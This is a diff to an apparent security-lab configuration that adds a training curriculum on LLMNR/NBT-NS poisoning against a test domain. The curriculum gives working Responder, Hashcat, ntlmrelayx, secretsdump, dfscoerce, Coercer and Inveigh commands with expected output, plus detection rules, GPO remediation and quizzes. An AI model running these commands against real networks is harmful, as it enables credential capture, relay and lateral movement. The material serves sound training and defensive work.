@@ -79,15 +79,25 @@ detection:
     - "Windows Event 4624 logon type 3 — sudden NTLMv2 hash submissions from new sources"
 
 targets:
+  # 2026-05-23 audit fix: LLMNR + NBT-NS are default-on broadcast resolvers
+  # on every Windows SKU. Any host that joins the same broadcast domain
+  # answers — workstation, member, DC. Previous "DC only" hid the
+  # technique from workstations where it's actually most exploitable.
   supported_os:
     - family: windows
-      min_version: "2016"
+      min_version: "7"
+      max_version: "11"
+      edition_in: []
+    - family: windows
+      min_version: "2008"
       max_version: "2025"
-      edition_in: ["Datacenter", "Standard"]
+      edition_in: []
   required_roles:
+    - workstation
+    - member_server
     - domain_controller
   required_services: []
-  required_domain_function_level: "2016"
+  required_domain_function_level: null
 
 depends_on: []
 conflicts_with: []
@@ -233,5 +243,410 @@ cost:
   storage_mb: 0
   cpu_pct: 0
   detectability: loud
+
+curriculum:
+  title: "LLMNR / NBT-NS Poisoning + NTLM Relay"
+  summary: >
+    Guided walkthrough of broadcast-name-resolution poisoning against
+    `testlab.local`. From Kali at 192.168.1.100 you will run Responder
+    to capture a NetNTLMv2 hash from `tlws01` (10.99.50.12) when a user
+    mistypes a hostname, crack it offline, then chain Responder ->
+    `ntlmrelayx` to relay the next authentication into the
+    SMB-signing-disabled member server `tlms01` (10.99.50.11) for
+    SOCKS-pivot access. Also covers the modern PowerShell-native
+    `Inveigh` alternative from the beacon side, and the canonical
+    GPO-disable remediation.
+  learning_objectives:
+    - "Explain why LLMNR (UDP 5355) + NBT-NS (UDP 137) broadcast fallback creates a credential-harvest primitive."
+    - "Run Responder in capture mode and trigger a coercion from tlws01."
+    - "Crack NetNTLMv2 with Hashcat (mode 5600) and explain what makes the hash crackable."
+    - "Pivot from capture mode to relay mode with ntlmrelayx targeting tlms01 (SMB signing off)."
+    - "Use the `--socks` proxy + `proxychains` to operate as the relayed user."
+    - "Identify the Inveigh PowerShell alternative for beacon-side capture."
+    - "Apply the disable-LLMNR/NBT-NS GPO and confirm Responder goes silent."
+  prerequisites:
+    - "Kali at 192.168.1.100 with Responder (`/usr/share/responder/Responder.py`) + Impacket (`ntlmrelayx.py`) + Hashcat 6.x"
+    - "Layer-2 reachability from Kali to the testlab.local subnet — same broadcast domain as 10.99.50.0/24"
+    - "Beacon on tlws01 as TESTLAB\\jdoe for the Inveigh path + to trigger the mistyped-hostname coercion"
+    - "Bolt-on installed: the `Bolton-Enable-LLMNR-NBTNS` GPO is linked at the domain root and gpupdate has run"
+    - "Adjacent bolt-on `smb-signing-disabled` applied to tlms01 (10.99.50.11) — required for the relay step to succeed"
+  estimated_total_minutes: 45
+  steps:
+    - id: "01-context"
+      title: "Why broadcast name resolution leaks hashes"
+      estimated_minutes: 5
+      markdown: |
+        ## Step 1 — The Windows name-resolution fallback chain
+
+        When a Windows host (`tlws01`) resolves a hostname like
+        `\\fileshare01`, it walks this chain:
+
+        1. **`hosts` file** -> usually empty
+        2. **DNS** (resolver = `tldc01` at 10.99.50.10) -> if NXDOMAIN…
+        3. **LLMNR** (UDP/5355 multicast to `224.0.0.252`) -> any host
+           on the broadcast domain can answer
+        4. **NBT-NS** (UDP/137 broadcast) -> any host on the local
+           subnet can answer
+
+        Steps 3 and 4 trust **any responder** on the LAN. If the
+        attacker (Kali at 192.168.1.100) answers "I am
+        `fileshare01`, my IP is 192.168.1.100", Windows opens an
+        SMB session and immediately performs NTLM authentication.
+
+        Why the hash is exposed: the NTLMSSP NEGOTIATE/CHALLENGE/AUTH
+        message flow includes a **NetNTLMv2** response which is
+        derived from the user's password hash + a server-chosen
+        challenge — *and the attacker chose the challenge*. Crackable
+        offline.
+
+        Confirm the bolt-on has re-enabled the fallback:
+
+        ```bash
+        # From Kali — check that the GPO is applied on tlws01 via SMB
+        impacket-reg testlab.local/jdoe:'Welcome1!'@10.99.50.12 query \
+            -keyName 'HKLM\SOFTWARE\Policies\Microsoft\Windows NT\DNSClient' \
+            -v EnableMulticast
+        # Should return REG_DWORD 1
+        ```
+
+        > **Detection:** the *attacker-side* enabling traffic is
+        > Responder's poisoning UDP broadcast — invisible to
+        > endpoint EDR, visible only on the wire (network sensor /
+        > Suricata rule on UDP 5355 from non-DNS sources).
+    - id: "02-responder-listen"
+      title: "Capture a NetNTLMv2 hash with Responder"
+      estimated_minutes: 8
+      markdown: |
+        ## Step 2 — Run Responder in capture-only mode
+
+        On Kali:
+
+        ```bash
+        # Find your interface
+        ip route get 10.99.50.10 | awk '{print $5; exit}'
+        # Assume eth0 from here
+
+        sudo responder -I eth0 -wd
+        ```
+
+        Flags:
+        - `-I eth0` — listen on the lab interface
+        - `-w` — start the rogue WPAD/HTTP servers (catches browser auth too)
+        - `-d` — start the rogue DHCP server (optional, skip if hostile)
+
+        Responder banner should show "Listening for events…" with
+        LLMNR/NBT-NS/MDNS/HTTP/SMB poisoners ON.
+
+        ### Trigger the coercion from the beacon
+
+        From `tlws01` (as `TESTLAB\jdoe`), simulate a user mistyping a
+        share name:
+
+        ```text
+        beacon> shell dir \\fileshare01\public
+        ```
+
+        DNS returns NXDOMAIN (no `fileshare01` exists). Windows falls
+        back to LLMNR. Responder answers. `tlws01` opens an SMB
+        session to 192.168.1.100 and submits a NetNTLMv2 hash for
+        `TESTLAB\jdoe`.
+
+        On Kali, Responder console prints:
+
+        ```
+        [SMB] NTLMv2-SSP Client   : 10.99.50.12
+        [SMB] NTLMv2-SSP Username : TESTLAB\jdoe
+        [SMB] NTLMv2-SSP Hash     : jdoe::TESTLAB:1122334455667788:...
+        ```
+
+        Hashes are also written to `/usr/share/responder/logs/SMB-NTLMv2-SSP-10.99.50.12.txt`.
+
+        > **Detection:** no Elastic rule fires on the *capture*. The
+        > closest published bundled rule is
+        > `Suspicious DNS Query for Kerberos Coercion`
+        > (`99ac5005-8a9e-4625-a0af-5f7bb447204b`) which catches the
+        > DNS pre-step of NTLM coercion via Kerberos forwarding — not
+        > LLMNR fallback. Treat this phase as uncovered without a
+        > network sensor.
+      assessment:
+        question: "Why does Windows fall back to LLMNR even though DNS is configured and working?"
+        options:
+          - "LLMNR has higher priority than DNS in the Windows resolver."
+          - "Only when DNS returns NXDOMAIN does Windows fall back to LLMNR multicast — and an attacker on the broadcast domain can answer first."
+          - "LLMNR is preferred for single-label names by group policy default."
+          - "Windows always queries LLMNR in parallel with DNS for redundancy."
+        correct_index: 1
+        explanation: >
+          The Windows resolver is sequential: hosts file -> DNS ->
+          LLMNR -> NBT-NS. LLMNR is consulted only after DNS returns
+          NXDOMAIN (or the resolver times out). The attacker exploits
+          the fact that mistypes, unqualified hostnames, and
+          search-suffix misses all trigger this fallback, where the
+          response is trusted from any L2-adjacent host.
+    - id: "03-crack-hash"
+      title: "Crack the NetNTLMv2 hash offline"
+      estimated_minutes: 6
+      markdown: |
+        ## Step 3 — Hashcat mode 5600
+
+        ```bash
+        cp /usr/share/responder/logs/SMB-NTLMv2-SSP-10.99.50.12.txt /tmp/netntlmv2.txt
+        hashcat -m 5600 -a 0 /tmp/netntlmv2.txt /usr/share/wordlists/rockyou.txt
+        ```
+
+        Expected output for `TESTLAB\jdoe`:
+
+        ```
+        JDOE::TESTLAB:1122334455667788:...:Welcome1!
+        ```
+
+        ### Why NetNTLMv2 is crackable but slower than RC4 TGS
+
+        - **Algorithm**: HMAC-MD5(HMAC-MD5(NT-hash, username+domain), challenge+blob)
+        - **GPU speed**: ~10 GH/s on a single RTX 4090 (10 billion
+          guesses per second)
+        - rockyou.txt (14M entries) clears in **milliseconds**
+        - 8-character mixed-case + digit keyspace clears in **hours**
+        - 10+ character random keyspace is **infeasible** in
+          engagement time
+
+        Compare to Kerberoasting (mode 13100, RC4):
+        - RC4-HMAC: ~70 GH/s on the same GPU
+        - NetNTLMv2 ~7x slower, but still rockyou-cleared in seconds.
+
+        Validate the cracked credential against the domain:
+
+        ```bash
+        impacket-smbclient testlab.local/jdoe:'Welcome1!'@10.99.50.10
+        ```
+
+        > **Detection:** cracking is offline — no telemetry. The *use*
+        > of the cracked credential against `tldc01` produces a 4624
+        > Type 3 from 192.168.1.100, which is anomalous (attacker IP
+        > outside the lab subnet baseline) — UEBA territory.
+    - id: "04-pivot-to-relay"
+      title: "Pivot — relay instead of crack"
+      estimated_minutes: 10
+      markdown: |
+        ## Step 4 — ntlmrelayx with SOCKS
+
+        Cracking is the slow path. The **relay** path uses the
+        captured NTLMSSP message *live* to authenticate to a *third*
+        host as the coerced user — no cracking required, no
+        credential ever known.
+
+        Requirements:
+        - Target host has **SMB signing OFF** (the adjacent
+          `smb-signing-disabled` bolt-on configures this on `tlms01`).
+        - The coerced user is local admin on the target (or has
+          useful network access).
+
+        Verify `tlms01` accepts unsigned SMB:
+
+        ```bash
+        nmap -p445 --script smb2-security-mode 10.99.50.11
+        # Look for: "Message signing enabled but not required"
+        ```
+
+        Disable Responder's SMB/HTTP poisoners (so they don't compete
+        with ntlmrelayx) by editing `/usr/share/responder/Responder.conf`:
+
+        ```ini
+        [Responder Core]
+        SMB = Off
+        HTTP = Off
+        ```
+
+        Restart Responder:
+
+        ```bash
+        sudo responder -I eth0 -wd
+        ```
+
+        In a second terminal, launch ntlmrelayx targeting `tlms01`:
+
+        ```bash
+        impacket-ntlmrelayx -tf <(echo smb://10.99.50.11) \
+            -smb2support --socks --no-http-server \
+            --output-file /tmp/ntlmrelay.log
+        ```
+
+        Trigger again from the beacon:
+
+        ```text
+        beacon> shell dir \\fileshare02\public
+        ```
+
+        ntlmrelayx console shows:
+
+        ```
+        [*] Authenticating against smb://10.99.50.11 as TESTLAB/JDOE SUCCEED
+        [*] SOCKS: Adding TESTLAB/JDOE@10.99.50.11(445) to active SOCKS connection
+        ```
+
+        ### Operate via proxychains
+
+        ```bash
+        # /etc/proxychains4.conf — add at the end:
+        #   socks4 127.0.0.1 1080
+        proxychains -q impacket-smbclient -no-pass TESTLAB/jdoe@10.99.50.11
+        proxychains -q impacket-secretsdump -no-pass TESTLAB/jdoe@10.99.50.11
+        ```
+
+        You now read `tlms01`'s SAM as the relayed `jdoe` session,
+        without ever knowing the password. If `jdoe` is local admin
+        on `tlms01` (lab default), you have full SAM + LSA dump
+        capability.
+
+        ### Coercion options when "wait for a user to mistype"
+        isn't reliable
+
+        Pair this with an explicit coercion primitive on a beacon-less
+        host:
+
+        ```bash
+        # dfscoerce
+        impacket-dfscoerce -d testlab.local -u jdoe -p 'Welcome1!' \
+            192.168.1.100 10.99.50.11
+
+        # Coercer.py (multi-method)
+        coercer coerce --target-ip 10.99.50.11 --listener-ip 192.168.1.100 \
+            --username jdoe --password 'Welcome1!' --domain testlab.local
+        ```
+
+        > **Detection:** Elastic rules
+        > `Potential NTLM Relay Attack against a Computer Account`
+        > (`23e5407a-b696-4433-9297-087645f2726c`) and
+        > `Potential Computer Account NTLM Relay Activity`
+        > (`263481c8-1e9b-492e-912d-d1760707f810`) fire on the
+        > relayed authentication landing — high fidelity. The Kerberos
+        > variant rule `4682fd2c-cfae-47ed-a543-9bed37657aa6`
+        > covers the HTTP-front-end variant.
+    - id: "05-inveigh-alternative"
+      title: "Inveigh — beacon-side capture"
+      estimated_minutes: 5
+      markdown: |
+        ## Step 5 — When you can't get layer-2 to the segment
+
+        If the operator isn't on the broadcast domain (typical: you
+        have only a beacon on `tlws01`, no Kali on the LAN), use the
+        modern .NET-port of Inveigh from the beacon. Project:
+        https://github.com/Kevin-Robertson/Inveigh
+
+        ```text
+        beacon> execute-assembly /opt/inveigh/Inveigh.exe \
+                  -SMB Y -HTTP Y -LLMNR Y -NBNS Y -mDNS Y -DHCPv6 Y \
+                  -ConsoleOutput Y -OutputDirectory C:\Users\Public
+        ```
+
+        Inveigh runs from the beacon process, owns UDP 5355/137 on
+        `tlws01`, and captures every misdirected lookup that crosses
+        the *same host*. Output is written to
+        `C:\Users\Public\Inveigh\*-NTLMv2.txt` for exfil.
+
+        For pure capture without relay:
+
+        ```text
+        beacon> execute-assembly /opt/inveigh/Inveigh.exe \
+                  -Challenge 1122334455667788 -SMB Y -LLMNR Y -NBNS Y
+        ```
+
+        The fixed `-Challenge` makes cracked hashes consistent across
+        sessions (useful when you crack offline on a separate machine).
+
+        > **Detection:** Inveigh is .NET-loaded into the beacon
+        > process — no new PID. Sysmon Event 7 (Image loaded) can fire
+        > on the in-memory CLR load, but coverage depends on the
+        > beacon's reflective loader. No dedicated Elastic rule.
+    - id: "06-detect-and-mitigate"
+      title: "Blue-team — detection + mitigation"
+      estimated_minutes: 11
+      markdown: |
+        ## Step 6 — Detection + the canonical fix
+
+        ### Detection signal map
+
+        | Phase | Best signal | Rule / source |
+        |---|---|---|
+        | Responder poisoning | UDP 5355 unicast from non-DNS source | Network sensor (Suricata `dns-anomaly`) — not in Elastic rules |
+        | NetNTLMv2 capture | Sysmon Event 3 — SMB out to attacker IP | Build a SIEM rule on `dst_port=445 AND dst_ip NOT IN <known-servers>` |
+        | Relay landing on tlms01 | 4624 Type 3 with `Computer Name` ≠ origin host | `Potential NTLM Relay Attack against a Computer Account` (`23e5407a-…`), `Potential Computer Account NTLM Relay Activity` (`263481c8-…`) |
+        | DCSync via relay | 4662 with control GUID `1131f6aa-9c07-11d1-f79f-00c04fc2dcd2` | Elastic `Active Directory Replication from User Account` |
+
+        ### The fix — disable LLMNR + NBT-NS
+
+        The bolt-on's `patch` block deploys
+        `Bolton-Disable-LLMNR-NBTNS` GPO. Manually equivalent:
+
+        ```powershell
+        # On tldc01
+        $gpo = New-GPO -Name "Disable-LLMNR-NBTNS" -Comment "Hardening: kill broadcast resolution"
+        Set-GPRegistryValue -Name $gpo.DisplayName `
+          -Key 'HKLM\SOFTWARE\Policies\Microsoft\Windows NT\DNSClient' `
+          -ValueName 'EnableMulticast' -Type DWord -Value 0
+        Set-GPRegistryValue -Name $gpo.DisplayName `
+          -Key 'HKLM\SYSTEM\CurrentControlSet\Services\NetBT\Parameters' `
+          -ValueName 'NodeType' -Type DWord -Value 2   # P-node (WINS only)
+        Set-GPRegistryValue -Name $gpo.DisplayName `
+          -Key 'HKLM\SOFTWARE\Policies\Microsoft\Windows NT\DNSClient' `
+          -ValueName 'SearchList' -Type String -Value 'testlab.local'
+        New-GPLink -Name $gpo.DisplayName -Target 'DC=testlab,DC=local' -LinkEnabled Yes
+        gpupdate /force
+        ```
+
+        Why three settings, not one:
+        - `EnableMulticast=0` -> LLMNR off
+        - `NodeType=2` (P-node) -> NBT-NS off, WINS-only (use WINS=0
+          for full off if no legacy)
+        - `SearchList=testlab.local` -> single-label `dir
+          \\fileshare01` becomes `\\fileshare01.testlab.local` and gets
+          DNS-resolved properly — no fallback at all
+
+        ### Validate the fix
+
+        ```bash
+        # From Kali, re-run Responder
+        sudo responder -I eth0 -wd
+
+        # On tlws01, trigger again
+        beacon> shell dir \\fileshare01\public
+
+        # Responder should NOT see a poison opportunity
+        # Windows resolver should fail cleanly: "Network path not found"
+        ```
+
+        ### Defence-in-depth controls
+
+        1. **SMB signing required** domain-wide (the
+           `smb-signing-disabled` bolt-on's patch) — kills the relay
+           path even if LLMNR re-enables.
+        2. **Extended Protection for Authentication (EPA)** on every
+           HTTP-front-end service (LDAPS, ADCS, OWA) — kills HTTP-front
+           relay variants.
+        3. **NTLM auditing** GPO -> Event 8004 -> alerts on NTLM
+           inbound from unknown source IPs.
+        4. **Kerberos-only enforcement** on critical services (eliminate
+           NTLM entirely where possible).
+
+        > **Mitigation references:** MITRE M1037 (Filter Network
+        > Traffic), Microsoft "Disabling LLMNR" doc
+        > (https://learn.microsoft.com/en-us/troubleshoot/windows-client/networking/disable-llmnr-debug-network-issues),
+        > CISA advisory on NTLM relay AA23-129A.
+      assessment:
+        question: "Why does merely cracking the NetNTLMv2 hash often miss the highest-value path the attacker can take?"
+        options:
+          - "Cracking takes longer than the engagement window for any password."
+          - "The relay path lets the attacker authenticate as the coerced user against a *third* host — including DCs, ADCS endpoints, or member servers — without ever knowing the password."
+          - "NetNTLMv2 hashes are not crackable in modern Windows versions."
+          - "Hashcat doesn't support the NetNTLMv2 format."
+        correct_index: 1
+        explanation: >
+          Cracking gives you the user's password. Relaying gives you
+          *the authenticated session itself* — bypassing password
+          policy, MFA-on-Kerberos, and anything else that lives at the
+          credential layer. ntlmrelayx + `--socks` lets the operator
+          run any Impacket tool through proxychains as the relayed
+          user, including DCSync if the user has the right primitive,
+          all without ever knowing or cracking the password.
 
 status: stable
